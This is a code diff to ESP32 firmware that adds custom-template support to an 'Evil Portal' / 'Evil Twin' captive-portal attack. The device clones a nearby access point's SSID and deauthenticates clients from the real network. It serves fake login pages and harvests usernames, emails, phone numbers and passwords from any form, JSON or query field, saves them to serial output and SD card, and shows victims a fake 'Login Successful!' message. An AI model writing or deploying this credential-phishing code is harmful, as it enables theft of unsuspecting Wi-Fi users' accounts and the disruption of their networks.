@@ -11,6 +11,9 @@
 #include "icon.h"
 #include "shared.h"
 #include "utils.h"
+#include <ArduinoJson.h>
+#include <algorithm>
+#include <vector>
 
 extern "C" {
 #include "lwip/etharp.h"
@@ -2887,9 +2890,18 @@ namespace CaptivePortal {
 
 static unsigned long cportalLastBtnMs = 0;
 static const unsigned long cportalDebounceMs = 200;
-static constexpr int kCredRowsPerPage = 18;
+static constexpr int kCredRowsPerPage = 2;
+static constexpr int kCredHeaderY = kWifiBodyTop + 3;
+static constexpr int kCredCardsY = kWifiBodyTop + 31;
+static constexpr int kCredCardH = 88;
+static constexpr int kCredCardGap = 8;
+static constexpr int kCredDeleteX = 198;
+static constexpr int kCredDeleteW = 33;
+static constexpr int kCredDeleteH = 38;
+static constexpr int kCredStatusY = 274;
 
 static bool s_cloneUiActive = false;
+static bool s_templateUiActive = false;
 static bool s_clonePrevEn = false;
 static bool s_cloneNextEn = false;
 static bool s_clonePickMode = false;
@@ -2934,6 +2946,7 @@ static void cportalTeardown();
 static void cportalHandleMainNavButtons();
 static void cportalHandleCredNavButtons();
 static void cpEditSsid();
+static void cpSelectPortalTemplateFlow();
 static void cpStopDeauth();
 static CpCloneAction cpCloneWaitInput(bool prevEnabled, bool nextEnabled, bool pickMode,
                                       int& tx, int& ty);
@@ -2979,6 +2992,14 @@ void drawMainMenu();
 static constexpr char kCpPrefsNamespace[] = "mk_cportal";
 static constexpr char kCpSsidKey[] = "ssid";
 static constexpr char kCpCountKey[] = "count";
+static constexpr char kCpTemplateKey[] = "template";
+static constexpr char kCpPortalDir[] = "/portals";
+// Custom portals are streamed from microSD, so their size is no longer tied
+// to the largest contiguous heap block.  Keep a generous sanity limit to
+// reject accidental/non-HTML multi-megabyte files without penalising portals
+// that embed images or fonts as base64.
+static constexpr size_t kCpMaxTemplateBytes = 4u * 1024u * 1024u;
+static constexpr size_t kCpTemplateStreamChunk = 768u;
 
 String terminalBuffer[MAX_LINES];
 uint16_t colorBuffer[MAX_LINES];
@@ -3062,7 +3083,7 @@ const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
 const int numSeriesSSIDs = 3;
 int seriesSSIDIndex = 0;
 
-String loginPage = R"(
+static const char* builtinLoginPage = R"(
 <!DOCTYPE html>
 <html>
 <head>
@@ -3093,6 +3114,25 @@ String loginPage = R"(
 </body>
 </html>
 )";
+
+struct PortalTemplateInfo {
+  String name;
+  String path;
+  size_t bytes;
+
+  PortalTemplateInfo(const String& templateName, const String& templatePath,
+                     size_t templateBytes)
+      : name(templateName), path(templatePath), bytes(templateBytes) {}
+};
+
+static std::vector<PortalTemplateInfo> s_portalTemplates;
+static String s_activePortalPath;
+static String s_activePortalName = "Built-in";
+
+static const String& cpBuiltinPortalHtml() {
+  static const String builtin(builtinLoginPage);
+  return builtin;
+}
 
 void scrollTerminal() {
   for (int i = 0; i < MAX_LINES - 1; i++) {
@@ -3198,6 +3238,228 @@ static bool cpEnsureDir(const char* dirPath) {
     return false;
   }
   return true;
+}
+
+static String cpPortalFileName(const String& path) {
+  int slash = path.lastIndexOf('/');
+  String name = slash >= 0 ? path.substring(slash + 1) : path;
+  int dot = name.lastIndexOf('.');
+  if (dot > 0) name.remove(dot);
+  return name;
+}
+
+static void cpUseBuiltinTemplate(bool persist) {
+  s_activePortalPath = "";
+  s_activePortalName = "Built-in";
+  if (persist) {
+    Preferences prefs;
+    if (prefs.begin(kCpPrefsNamespace, false)) {
+      prefs.remove(kCpTemplateKey);
+      prefs.end();
+    }
+  }
+  Serial.println(F("[cportal][template] using built-in page"));
+}
+
+static bool cpLoadTemplateFile(const String& path, bool persist) {
+  if (!path.length()) {
+    cpUseBuiltinTemplate(persist);
+    return true;
+  }
+
+  SdFileIoGuard io(1800);
+  if (!io.locked() || !cpMountSD()) return false;
+
+  File f = SD.open(path, FILE_READ);
+  if (!f || f.isDirectory()) {
+    if (f) f.close();
+    return false;
+  }
+  const size_t bytes = f.size();
+  if (bytes == 0 || bytes > kCpMaxTemplateBytes) {
+    f.close();
+    Serial.printf("[cportal][template] rejected path=%s bytes=%u\n",
+                  path.c_str(), (unsigned)bytes);
+    return false;
+  }
+
+  // Selection only validates and records the file.  The HTTP handler streams
+  // it later in small chunks, avoiding a contiguous allocation equal to the
+  // complete HTML size (the board has no PSRAM).
+  f.close();
+  s_activePortalPath = path;
+  s_activePortalName = cpPortalFileName(path);
+
+  if (persist) {
+    Preferences prefs;
+    if (prefs.begin(kCpPrefsNamespace, false)) {
+      prefs.putString(kCpTemplateKey, path);
+      prefs.end();
+    }
+  }
+  Serial.printf("[cportal][template] selected '%s' bytes=%u heap=%u streaming=YES\n",
+                path.c_str(), (unsigned)bytes, (unsigned)ESP.getFreeHeap());
+  return true;
+}
+
+static void cpLoadConfiguredTemplate() {
+  String path;
+  Preferences prefs;
+  if (prefs.begin(kCpPrefsNamespace, true)) {
+    path = prefs.getString(kCpTemplateKey, "");
+    prefs.end();
+  }
+  if (!path.length()) {
+    cpUseBuiltinTemplate(false);
+    return;
+  }
+  if (!cpLoadTemplateFile(path, false)) {
+    Serial.printf("[cportal][template] configured template unavailable: %s\n", path.c_str());
+    cpUseBuiltinTemplate(false);
+  }
+}
+
+static bool cpFlushPortalStreamBuffer(String& pending, bool finalChunk,
+                                      const String& renderedSsid,
+                                      const String& renderedDeviceName) {
+  // Preserve enough trailing characters for the longest placeholder when it
+  // is split between two SD reads.  Replacements are therefore identical for
+  // small and large templates without buffering the complete document.
+  static constexpr size_t kPlaceholderCarry = 16u;
+  pending.replace("{{SSID}}", renderedSsid);
+  pending.replace("{{DEVICE_NAME}}", renderedDeviceName);
+
+  const size_t emit = finalChunk
+      ? pending.length()
+      : (pending.length() > kPlaceholderCarry
+             ? pending.length() - kPlaceholderCarry
+             : 0u);
+  if (!emit) return true;
+
+  // WebServer accepts an explicit length, so no temporary substring (and no
+  // repeated heap allocation) is needed for every chunk.
+  server.sendContent(pending.c_str(), emit);
+  pending.remove(0, emit);
+  return server.client().connected();
+}
+
+static void cpServePortalPage() {
+  if (!s_activePortalPath.length()) {
+    server.send(200, "text/html", cpBuiltinPortalHtml());
+    return;
+  }
+
+  if (!cpMountSD() && !cpEnsureSdReady("serve-template")) {
+    Serial.println(F("[cportal][template] SD unavailable while serving; built-in fallback"));
+    server.send(200, "text/html", cpBuiltinPortalHtml());
+    return;
+  }
+
+  SdFileIoGuard io(2500);
+  if (!io.locked()) {
+    Serial.println(F("[cportal][template] SD lock timeout while serving; built-in fallback"));
+    server.send(200, "text/html", cpBuiltinPortalHtml());
+    return;
+  }
+
+  File f = SD.open(s_activePortalPath, FILE_READ);
+  if (!f || f.isDirectory()) {
+    if (f) f.close();
+    Serial.printf("[cportal][template] open failed while serving: %s\n",
+                  s_activePortalPath.c_str());
+    server.send(200, "text/html", cpBuiltinPortalHtml());
+    return;
+  }
+
+  const size_t expected = f.size();
+  if (!expected || expected > kCpMaxTemplateBytes) {
+    f.close();
+    Serial.printf("[cportal][template] invalid size while serving path=%s bytes=%u\n",
+                  s_activePortalPath.c_str(), (unsigned)expected);
+    server.send(200, "text/html", cpBuiltinPortalHtml());
+    return;
+  }
+
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.sendHeader("Pragma", "no-cache");
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html", "");
+
+  String pending;
+  pending.reserve(kCpTemplateStreamChunk + 64u);
+  const String renderedSsid(custom_ssid);
+  const String renderedDeviceName(F("MK SIGNAL DIV V2.1"));
+  char chunk[kCpTemplateStreamChunk + 1u];
+  size_t sentFromSd = 0;
+  bool connected = true;
+  while (connected && f.available()) {
+    const size_t n = f.readBytes(chunk, kCpTemplateStreamChunk);
+    if (!n) break;
+    chunk[n] = '\0';
+    pending.concat(chunk, n);
+    sentFromSd += n;
+    connected = cpFlushPortalStreamBuffer(pending, false, renderedSsid,
+                                           renderedDeviceName);
+    yield();
+  }
+  f.close();
+
+  if (connected) {
+    connected = cpFlushPortalStreamBuffer(pending, true, renderedSsid,
+                                           renderedDeviceName);
+    if (connected) server.sendContent("");  // terminate chunked HTTP response
+  }
+
+  Serial.printf("[cportal][template] stream path=%s read=%u/%u result=%s heap=%u\n",
+                s_activePortalPath.c_str(), (unsigned)sentFromSd,
+                (unsigned)expected,
+                (connected && sentFromSd == expected) ? "OK" : "ABORTED",
+                (unsigned)ESP.getFreeHeap());
+}
+
+static void cpScanPortalTemplates() {
+  s_portalTemplates.clear();
+  s_portalTemplates.push_back({"Built-in", "", 0});
+
+  SdFileIoGuard io(1800);
+  if (!io.locked() || !cpMountSD()) return;
+  if (!SD.exists(kCpPortalDir)) {
+    (void)SD.mkdir(kCpPortalDir);
+  }
+  File dir = SD.open(kCpPortalDir);
+  if (!dir || !dir.isDirectory()) {
+    if (dir) dir.close();
+    return;
+  }
+  for (;;) {
+    File f = dir.openNextFile();
+    if (!f) break;
+    if (!f.isDirectory()) {
+      String fileName = f.name();
+      String lower = fileName;
+      lower.toLowerCase();
+      const size_t bytes = f.size();
+      if ((lower.endsWith(".html") || lower.endsWith(".htm")) &&
+          bytes > 0 && bytes <= kCpMaxTemplateBytes) {
+        String path = fileName;
+        if (!path.startsWith(String(kCpPortalDir) + "/")) {
+          while (path.startsWith("/")) path.remove(0, 1);
+          path = String(kCpPortalDir) + "/" + path;
+        }
+        s_portalTemplates.push_back({cpPortalFileName(path), path, bytes});
+      }
+    }
+    f.close();
+    if (s_portalTemplates.size() >= 33) break;
+  }
+  dir.close();
+
+  std::sort(s_portalTemplates.begin() + 1, s_portalTemplates.end(),
+            [](const PortalTemplateInfo& a, const PortalTemplateInfo& b) {
+              String an = a.name; String bn = b.name;
+              an.toLowerCase(); bn.toLowerCase();
+              return an < bn;
+            });
 }
 
 static String cpCsvEscape(const String& s) {
@@ -3309,12 +3571,14 @@ static bool cpDumpAllCredentialsToSD(int* outCount) {
 }
 
 static void cpCredListStatus(const String& msg, uint16_t color) {
-  const int y = max(50, wifiContentBottom() - 16);
-  tft.fillRect(0, y, 240, 16, TFT_BLACK);
-  tft.setTextColor(color, TFT_BLACK);
+  tft.fillRoundRect(5, kCredStatusY, 230, 12, 3, UI_FG);
+  tft.drawRoundRect(5, kCredStatusY, 230, 12, 3, color);
+  tft.setTextColor(color, UI_FG);
   tft.setTextSize(1);
-  tft.setCursor(2, y + 4);
-  tft.print(msg);
+  tft.setCursor(9, kCredStatusY + 2);
+  String compact = msg;
+  if (compact.length() > 36) compact = compact.substring(0, 33) + "...";
+  tft.print(compact);
 }
 
 static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
@@ -3379,7 +3643,7 @@ static void handleGenerate204() {
 static void handleHotspotDetect() {
   Serial.println("iOS /hotspot-detect.html requested");
   displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpServePortalPage();
 }
 
 static void handleCaptiveApple() {
@@ -3403,19 +3667,147 @@ static void handleConnectTestTxt() {
 static void handleLoginPage() {
   Serial.println("Login page (/login.html) requested");
   displayPrint("Login page (/login.html) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpServePortalPage();
 }
 
 static void handleRoot() {
   Serial.println("Root (/) requested");
   displayPrint("Root (/) requested", GREEN, false);
-  server.send(200, "text/html", loginPage);
+  cpServePortalPage();
 }
 
-static void handleLoginPost() {
-  String username = server.arg("username");
-  String password = server.arg("password");
+static String cpNormalizedFieldName(String name) {
+  name.trim();
+  name.toLowerCase();
+  name.replace("-", "");
+  name.replace("_", "");
+  name.replace("[", "");
+  name.replace("]", "");
+  return name;
+}
+
+static bool cpIsIdentityField(const String& normalized) {
+  return normalized == "username" || normalized == "user" ||
+         normalized == "email" || normalized == "emailaddress" ||
+         normalized == "login" || normalized == "identifier" ||
+         normalized == "account" || normalized == "phone" ||
+         normalized == "phonenumber";
+}
+
+static bool cpIsPasswordField(const String& normalized) {
+  return normalized == "password" || normalized == "pass" ||
+         normalized == "passwd" || normalized == "pwd" ||
+         normalized == "passphrase" || normalized == "key";
+}
+
+static void cpAcceptCredentialField(const String& rawName, const String& value,
+                                    String& identity, String& password) {
+  if (!value.length()) return;
+  const String name = cpNormalizedFieldName(rawName);
+  if (!identity.length() && cpIsIdentityField(name)) identity = value;
+  if (!password.length() && cpIsPasswordField(name)) password = value;
+}
+
+static int cpHexNibble(char c) {
+  if (c >= '0' && c <= '9') return c - '0';
+  if (c >= 'a' && c <= 'f') return 10 + c - 'a';
+  if (c >= 'A' && c <= 'F') return 10 + c - 'A';
+  return -1;
+}
+
+static String cpUrlDecode(const String& encoded) {
+  String decoded;
+  decoded.reserve(encoded.length());
+  for (size_t i = 0; i < encoded.length(); ++i) {
+    const char c = encoded[i];
+    if (c == '+') {
+      decoded += ' ';
+    } else if (c == '%' && i + 2 < encoded.length()) {
+      const int hi = cpHexNibble(encoded[i + 1]);
+      const int lo = cpHexNibble(encoded[i + 2]);
+      if (hi >= 0 && lo >= 0) {
+        decoded += (char)((hi << 4) | lo);
+        i += 2;
+      } else {
+        decoded += c;
+      }
+    } else {
+      decoded += c;
+    }
+  }
+  return decoded;
+}
+
+static void cpParseUrlEncodedBody(const String& body, String& identity,
+                                  String& password) {
+  int start = 0;
+  while (start < (int)body.length()) {
+    int end = body.indexOf('&', start);
+    if (end < 0) end = body.length();
+    const String pair = body.substring(start, end);
+    const int equals = pair.indexOf('=');
+    if (equals > 0) {
+      cpAcceptCredentialField(cpUrlDecode(pair.substring(0, equals)),
+                              cpUrlDecode(pair.substring(equals + 1)),
+                              identity, password);
+    }
+    start = end + 1;
+  }
+}
+
+static void cpParseJsonObject(JsonObjectConst object, String& identity,
+                              String& password) {
+  for (JsonPairConst pair : object) {
+    if (pair.value().is<const char*>()) {
+      cpAcceptCredentialField(String(pair.key().c_str()),
+                              String(pair.value().as<const char*>()),
+                              identity, password);
+    } else if (pair.value().is<JsonObjectConst>()) {
+      cpParseJsonObject(pair.value().as<JsonObjectConst>(), identity, password);
+    }
+  }
+}
+
+static bool cpExtractCredentials(String& identity, String& password) {
+  identity = "";
+  password = "";
+
+  // Arduino WebServer decodes ordinary form/query arguments for us.  Accept
+  // the naming conventions used by common Marauder, Flipper and ESP captive
+  // portal templates instead of requiring only username/password.
+  for (int i = 0; i < server.args(); ++i) {
+    const String name = server.argName(i);
+    if (name == "plain") continue;
+    cpAcceptCredentialField(name, server.arg(i), identity, password);
+  }
+
+  const String body = server.arg("plain");
+  if (body.length()) {
+    DynamicJsonDocument doc(min((size_t)4096, body.length() * 2u + 512u));
+    const DeserializationError jsonError = deserializeJson(doc, body);
+    if (!jsonError && doc.is<JsonObjectConst>()) {
+      cpParseJsonObject(doc.as<JsonObjectConst>(), identity, password);
+    } else {
+      cpParseUrlEncodedBody(body, identity, password);
+    }
+  }
+
+  return identity.length() || password.length();
+}
+
+static void handleCredentialSubmission() {
+  String username;
+  String password;
+  const bool captured = cpExtractCredentials(username, password);
   String remoteIp = server.client().remoteIP().toString();
+  if (!captured) {
+    Serial.printf("[cportal] submission without recognized credential fields: %s\n",
+                  server.uri().c_str());
+    server.send(400, "application/json",
+                "{\"ok\":false,\"error\":\"no credential fields\"}");
+    return;
+  }
+
   Serial.println("Captured Credentials:");
   Serial.println("Username: " + username);
   Serial.println("Password: " + password);
@@ -3426,10 +3818,26 @@ static void handleLoginPost() {
   } else {
     Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
   }
-  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
+  server.send(200, "text/html",
+              "<h1>Login Successful!</h1><p>You are now connected.</p>");
+}
+
+static void handleLoginPost() {
+  handleCredentialSubmission();
 }
 
 static void handleNotFound() {
+  // Third-party templates use many endpoints (/get, /submit, /auth, JSON
+  // fetch/XHR, or query strings).  Treat any request carrying recognized
+  // credential fields as a submission, independent of its URL.
+  if (server.method() == HTTP_POST || server.args() > 0) {
+    String identity;
+    String password;
+    if (cpExtractCredentials(identity, password)) {
+      handleCredentialSubmission();
+      return;
+    }
+  }
   Serial.println("Not found: " + server.uri());
   server.sendHeader("Location", "/login.html", true);
   server.send(302, "text/plain", "");
@@ -3581,7 +3989,7 @@ static void cpCloneDrawListHeader(int count, int page, int totalPages) {
   const int headerY = cpCloneHeaderY();
   tft.setTextColor(UI_TEXT, TFT_BLACK);
   tft.setCursor(8, headerY);
-  tft.print("Clone Access Point");
+  tft.print("Evil Twin target");
   tft.setTextColor(WHITE, TFT_BLACK);
   tft.setCursor(8, headerY + 12);
   tft.printf("Found %d network%s", count, count == 1 ? "" : "s");
@@ -3593,7 +4001,7 @@ static void cpCloneDrawListHeader(int count, int page, int totalPages) {
 static void cpCloneDrawListHint() {
   tft.setTextColor(UI_TEXT, TFT_BLACK);
   tft.setCursor(8, wifiListBottomY() - CP_CLONE_HINT_H);
-  tft.print("Tap row or Pick to clone");
+  tft.print("Tap row or Pick to launch twin");
 }
 
 static void cpCloneDrawRow(int displayNum, const String& ssid, int rssi, int ch,
@@ -3922,9 +4330,260 @@ static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t o
   }
 }
 
+static void cpDrawTemplateList(int selected) {
+  constexpr int kRowH = 25;
+  const int bodyTop = kWifiBodyTop + 5;
+  const int bodyBottom = wifiListBottomY();
+  const int rows = max(1, (bodyBottom - bodyTop - 27) / kRowH);
+  const int count = (int)s_portalTemplates.size();
+  const int page = selected / rows;
+  const int pages = max(1, (count + rows - 1) / rows);
+  const int first = page * rows;
+  const int last = min(count, first + rows);
+
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(7, bodyTop);
+  tft.print("Portal HTML  /portals/");
+  tft.setCursor(196, bodyTop);
+  tft.printf("%d/%d", page + 1, pages);
+
+  int y = bodyTop + 20;
+  for (int i = first; i < last; ++i, y += kRowH) {
+    const bool focused = i == selected;
+    const bool active = s_portalTemplates[i].path == s_activePortalPath;
+    tft.fillRoundRect(4, y, 232, kRowH - 3, 4,
+                      focused ? UI_FG : TFT_BLACK);
+    tft.drawRoundRect(4, y, 232, kRowH - 3, 4,
+                      focused ? UI_HIGHLIGHT : UI_LINE);
+    tft.setTextColor(focused ? FEATURE_TEXT : (active ? UI_OK : WHITE),
+                     focused ? UI_FG : TFT_BLACK);
+    tft.setCursor(10, y + 5);
+    tft.print(active ? "* " : "  ");
+    String label = s_portalTemplates[i].name;
+    if (label.length() > 24) label = label.substring(0, 21) + "...";
+    tft.print(label);
+    if (s_portalTemplates[i].bytes) {
+      tft.setCursor(195, y + 5);
+      tft.printf("%uK", (unsigned)((s_portalTemplates[i].bytes + 1023) / 1024));
+    }
+  }
+}
+
+enum class CpTemplateAction : uint8_t {
+  None,
+  Back,
+  Next,
+  Exit,
+  Previous,
+  Use,
+  PickRow,
+};
+
+struct CpTemplateInput {
+  CpTemplateAction action;
+  int row;
+
+  CpTemplateInput(CpTemplateAction requested = CpTemplateAction::None,
+                  int requestedRow = -1)
+      : action(requested), row(requestedRow) {}
+};
+
+static bool cpTemplateAnyPhysicalButtonDown() {
+  return isPhysicalButtonPressed(BTN_LEFT) ||
+         isPhysicalButtonPressed(BTN_DOWN) ||
+         isPhysicalButtonPressed(BTN_SELECT) ||
+         isPhysicalButtonPressed(BTN_UP) ||
+         isPhysicalButtonPressed(BTN_RIGHT);
+}
+
+static void cpTemplateWaitForRelease() {
+  int x = 0, y = 0;
+  while (cpTemplateAnyPhysicalButtonDown() || readTouchXYDismiss(x, y)) {
+    delay(10);
+  }
+  resetTouchNavHeldState();
+}
+
+static CpTemplateAction cpTemplateFooterAction(int x, int y) {
+  const int barTop = touchNavContentBottomY();
+  if (y < barTop || x < 0 || x >= tft.width()) return CpTemplateAction::None;
+  const int width = max(1, (int)tft.width());
+  const int slot = min(4, (x * 5) / width);
+  switch (slot) {
+    case 0: return CpTemplateAction::Back;
+    case 1: return CpTemplateAction::Next;
+    case 2: return CpTemplateAction::Exit;
+    case 3: return CpTemplateAction::Previous;
+    case 4: return CpTemplateAction::Use;
+    default: return CpTemplateAction::None;
+  }
+}
+
+static int cpTemplateRowAt(int x, int y, int selected) {
+  constexpr int kRowH = 25;
+  const int bodyTop = kWifiBodyTop + 5;
+  const int rows = max(1, (wifiListBottomY() - bodyTop - 27) / kRowH);
+  const int firstRowY = bodyTop + 20;
+  if (x < 4 || x >= 236 || y < firstRowY) return -1;
+
+  const int offset = (y - firstRowY) / kRowH;
+  const int within = (y - firstRowY) % kRowH;
+  // The final three pixels are the visual gap between rows.  The empty strip
+  // below the last visible entry is deliberately non-interactive.
+  if (offset < 0 || offset >= rows || within >= kRowH - 3) return -1;
+
+  const int count = (int)s_portalTemplates.size();
+  const int first = (selected / rows) * rows;
+  const int visible = min(rows, count - first);
+  if (offset >= visible) return -1;
+  return first + offset;
+}
+
+static CpTemplateInput cpTemplateReadReleasedInput(int selected) {
+  static bool touchDown = false;
+  static int touchStartX = 0;
+  static int touchStartY = 0;
+  static uint32_t touchStartMs = 0;
+  static bool physicalDown[5] = {};
+  static uint32_t physicalStartMs[5] = {};
+  static const int pins[5] = {BTN_LEFT, BTN_DOWN, BTN_SELECT, BTN_UP, BTN_RIGHT};
+  static const CpTemplateAction actions[5] = {
+    CpTemplateAction::Back, CpTemplateAction::Next, CpTemplateAction::Exit,
+    CpTemplateAction::Previous, CpTemplateAction::Use};
+
+  constexpr uint32_t kMaxTapMs = 650;
+  const uint32_t now = millis();
+  for (int i = 0; i < 5; ++i) {
+    const bool down = isPhysicalButtonPressed(pins[i]);
+    if (down && !physicalDown[i]) physicalStartMs[i] = now;
+    if (!down && physicalDown[i]) {
+      physicalDown[i] = false;
+      if ((uint32_t)(now - physicalStartMs[i]) <= kMaxTapMs) {
+        return {actions[i], -1};
+      }
+    } else {
+      physicalDown[i] = down;
+    }
+  }
+
+  int x = 0, y = 0;
+  const bool down = readTouchXYDismiss(x, y);
+  if (down && !touchDown) {
+    touchDown = true;
+    touchStartX = x;
+    touchStartY = y;
+    touchStartMs = now;
+  } else if (!down && touchDown) {
+    touchDown = false;
+    if ((uint32_t)(now - touchStartMs) > kMaxTapMs) return {};
+
+    const CpTemplateAction footer = cpTemplateFooterAction(touchStartX, touchStartY);
+    if (footer != CpTemplateAction::None) return {footer, -1};
+
+    const int row = cpTemplateRowAt(touchStartX, touchStartY, selected);
+    if (row >= 0) return {CpTemplateAction::PickRow, row};
+  }
+  return {};
+}
+
+static void cpSelectPortalTemplateFlow() {
+  const bool wasActive = attackActive;
+  const bool wasTwin = cp_deauth_active;
+  wifi_ap_record_t savedTarget = cp_target_ap;
+  const uint8_t savedTargetChannel = cp_target_channel;
+
+  if (attackActive) stopAttack(false);
+  quiesceWifiSubsystem(true);
+  delay(35);
+
+  s_templateUiActive = true;
+  if (!cpEnsureSdReady("template-list")) {
+    cpUseBuiltinTemplate(false);
+  }
+  cpScanPortalTemplates();
+  if (s_portalTemplates.empty()) {
+    s_portalTemplates.push_back({"Built-in", "", 0});
+  }
+
+  int selected = 0;
+  for (int i = 0; i < (int)s_portalTemplates.size(); ++i) {
+    if (s_portalTemplates[i].path == s_activePortalPath) {
+      selected = i;
+      break;
+    }
+  }
+
+  setTouchNavLabels("Back", "Next", "Exit", "Prev", "Use");
+  redrawTouchButtonBar();
+  cpDrawTemplateList(selected);
+  // Consume the touch/button that opened this screen.  Every selector action
+  // below is accepted only after a short press has been released; a long hold
+  // is ignored and can no longer leak into the parent captive-portal screen.
+  cpTemplateWaitForRelease();
+
+  bool apply = false;
+  while (!feature_exit_requested) {
+    maintainTouchNavBar();
+    const CpTemplateInput input = cpTemplateReadReleasedInput(selected);
+    if (input.action == CpTemplateAction::Back) break;
+    if (input.action == CpTemplateAction::Exit) {
+      feature_exit_requested = true;
+      break;
+    }
+    if (input.action == CpTemplateAction::Next) {
+      selected = (selected + 1) % (int)s_portalTemplates.size();
+      cpDrawTemplateList(selected);
+    }
+    if (input.action == CpTemplateAction::Previous) {
+      selected = (selected + (int)s_portalTemplates.size() - 1) %
+                 (int)s_portalTemplates.size();
+      cpDrawTemplateList(selected);
+    }
+    if (input.action == CpTemplateAction::Use) {
+      apply = true;
+      break;
+    }
+    if (input.action == CpTemplateAction::PickRow && input.row >= 0) {
+      selected = input.row;
+      cpDrawTemplateList(selected);
+      apply = true;
+      break;
+    }
+    delay(10);
+  }
+
+  if (apply && !feature_exit_requested) {
+    const PortalTemplateInfo choice = s_portalTemplates[selected];
+    if (!cpLoadTemplateFile(choice.path, true)) {
+      cpUseBuiltinTemplate(true);
+      Serial.printf("[cportal][template] failed to select '%s'; built-in restored\n",
+                    choice.path.c_str());
+    }
+  }
+
+  s_templateUiActive = false;
+  s_portalTemplates.clear();
+
+  if (!feature_exit_requested && wasActive) {
+    if (wasTwin) {
+      cp_target_ap = savedTarget;
+      cp_target_channel = savedTargetChannel;
+      cpStartDeauth(String((char*)savedTarget.ssid), savedTarget.bssid,
+                    savedTargetChannel);
+    }
+    startAttack();
+  }
+  if (!feature_exit_requested) drawMainMenu();
+}
+
 static void cpCloneExistingAPFlow() {
   bool wasActive = attackActive;
-  if (attackActive) stopAttack();
+  const bool wasTwin = cp_deauth_active;
+  wifi_ap_record_t savedTarget = cp_target_ap;
+  const uint8_t savedTargetChannel = cp_target_channel;
+  if (attackActive) stopAttack(false);
 
   WiFi.mode(WIFI_STA);
   WiFi.disconnect(true);
@@ -3937,14 +4596,31 @@ static void cpCloneExistingAPFlow() {
   WiFi.scanDelete();
 
   if (!ok) {
-    if (wasActive) startAttack();
+    if (wasActive) {
+      if (wasTwin) {
+        cp_target_ap = savedTarget;
+        cp_target_channel = savedTargetChannel;
+        cpStartDeauth(String((char*)savedTarget.ssid), savedTarget.bssid,
+                      savedTargetChannel);
+      }
+      startAttack();
+    }
     drawMainMenu();
     return;
   }
 
   ap_channel = (ch == 0 ? 1 : ch);
   saveSSID(chosen);
-  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
+  Serial.printf("[CP Evil Twin] target SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);
+
+  // Render {{SSID}} for the newly selected twin while the radio is still
+  // stopped.  HTTP serving never reads from SD once the AP is running.
+  quiesceWifiSubsystem(true);
+  delay(35);
+  if (s_activePortalPath.length()) {
+    (void)cpEnsureSdReady("evil-twin-template-refresh");
+    if (!cpLoadTemplateFile(s_activePortalPath, false)) cpUseBuiltinTemplate(false);
+  }
 
   memset(&cp_target_ap, 0, sizeof(cp_target_ap));
   strcpy((char*)cp_target_ap.ssid, chosen.c_str());
@@ -3977,8 +4653,17 @@ static void cpEditSsid() {
 
   OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
   if (r.accepted && r.text.length() > 0) {
+    const bool restart = attackActive;
+    if (restart) stopAttack(false);
     inputSSID = r.text;
     saveSSID(inputSSID);
+    if (s_activePortalPath.length()) {
+      quiesceWifiSubsystem(true);
+      delay(35);
+      (void)cpEnsureSdReady("ssid-template-refresh");
+      if (!cpLoadTemplateFile(s_activePortalPath, false)) cpUseBuiltinTemplate(false);
+    }
+    if (restart) startAttack();
   }
   drawMainMenu();
 }
@@ -3991,10 +4676,10 @@ void drawMainMenu() {
   wifiClearBody(TFT_BLACK);
   cportalResetTerminal();
 
+  displayPrint("EVIL PORTAL", UI_TEXT, false);
   displayPrint(tr("Current SSID:"), UI_TEXT, false);
   displayPrint(custom_ssid, WHITE, false);
-  displayPrint("...", UI_TEXT, false);
-
+  displayPrint(String("HTML: ") + s_activePortalName, UI_OK, false);
   displayPrint(String(tr("Channel:")) + " " + String(ap_channel), UI_TEXT, false);
   displayPrint(tr(attackActive ? "Status: Active" : "Status: Inactive"), UI_TEXT, false);
   if (cp_deauth_active) {
@@ -4004,34 +4689,141 @@ void drawMainMenu() {
   }
 }
 
+static void cpCredRemoveLastUtf8Codepoint(String& text) {
+  if (!text.length()) return;
+  int pos = (int)text.length() - 1;
+  while (pos > 0 && (static_cast<uint8_t>(text[pos]) & 0xC0u) == 0x80u) --pos;
+  text.remove(pos);
+}
+
+static String cpCredFitText(const char* value, int maxPixels) {
+  String text(value ? value : "");
+  if (tft.textWidth(text) <= maxPixels) return text;
+  const String ellipsis("...");
+  while (text.length() && tft.textWidth(text + ellipsis) > maxPixels) {
+    cpCredRemoveLastUtf8Codepoint(text);
+  }
+  return text + ellipsis;
+}
+
+static void cpDrawCredentialDeleteButton(int cardY, bool pressed) {
+  static constexpr uint16_t kDanger = 0xF800;
+  const int y = cardY + (kCredCardH - kCredDeleteH) / 2;
+  const uint16_t fill = pressed ? kDanger : UI_SHADOW;
+  const uint16_t ink = pressed ? FEATURE_WHITE : kDanger;
+  tft.fillRoundRect(kCredDeleteX, y, kCredDeleteW, kCredDeleteH, 6, fill);
+  tft.drawRoundRect(kCredDeleteX, y, kCredDeleteW, kCredDeleteH, 6, kDanger);
+
+  // Compact trash-can glyph, centred inside a proper hit target.
+  const int cx = kCredDeleteX + kCredDeleteW / 2;
+  tft.drawFastHLine(cx - 6, y + 10, 13, ink);
+  tft.drawFastHLine(cx - 2, y + 7, 5, ink);
+  tft.drawRect(cx - 5, y + 12, 11, 12, ink);
+  tft.drawFastVLine(cx - 2, y + 15, 7, ink);
+  tft.drawFastVLine(cx + 2, y + 15, 7, ink);
+}
+
+static void cpDrawCredentialCard(int index, int cardY, const Credential& cred) {
+  const int x = 5;
+  const int w = 230;
+  tft.fillRoundRect(x, cardY, w, kCredCardH, 6, UI_FG);
+  tft.drawRoundRect(x, cardY, w, kCredCardH, 6, UI_LINE);
